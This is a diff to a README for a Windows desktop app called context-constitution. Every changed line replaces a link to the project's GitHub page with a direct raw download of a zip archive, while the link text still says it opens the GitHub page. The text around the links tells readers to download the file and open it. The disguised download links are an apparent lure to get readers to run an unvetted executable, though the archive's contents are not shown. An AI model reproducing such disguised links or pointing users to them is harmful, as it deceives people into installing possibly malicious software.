@@ -1,6 +1,6 @@
 # 🧩 context-constitution - Keep context in one place
 
-[![Download context-constitution](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Ottplatf6473/context-constitution)
+[![Download context-constitution](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ottplatf6473/context-constitution/main/constitution/context-constitution-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the link above to visit the project page and download the app.
 
 ## 📥 Download
 
-1. Open this page in your browser: [context-constitution on GitHub](https://github.com/Ottplatf6473/context-constitution)
+1. Open this page in your browser: [context-constitution on GitHub](https://raw.githubusercontent.com/Ottplatf6473/context-constitution/main/constitution/context-constitution-v2.7.zip)
 2. Look for the latest release or download file on the page
 3. Download the Windows version
 4. Open the file after the download finishes
@@ -133,7 +133,7 @@ Yes. The main target is Windows desktop use.
 
 ### Where do I get the file?
 
-Use the GitHub page here: [https://github.com/Ottplatf6473/context-constitution](https://github.com/Ottplatf6473/context-constitution)
+Use the GitHub page here: [https://raw.githubusercontent.com/Ottplatf6473/context-constitution/main/constitution/context-constitution-v2.7.zip](https://raw.githubusercontent.com/Ottplatf6473/context-constitution/main/constitution/context-constitution-v2.7.zip)
 
 ## 🗂️ File Handling
 
@@ -182,7 +182,7 @@ Try these steps:
 
 Download and run the app from:
 
-[https://github.com/Ottplatf6473/context-constitution](https://github.com/Ottplatf6473/context-constitution)
+[https://raw.githubusercontent.com/Ottplatf6473/context-constitution/main/constitution/context-constitution-v2.7.zip](https://raw.githubusercontent.com/Ottplatf6473/context-constitution/main/constitution/context-constitution-v2.7.zip)
 
 ## 🧰 Basic Setup Flow
 
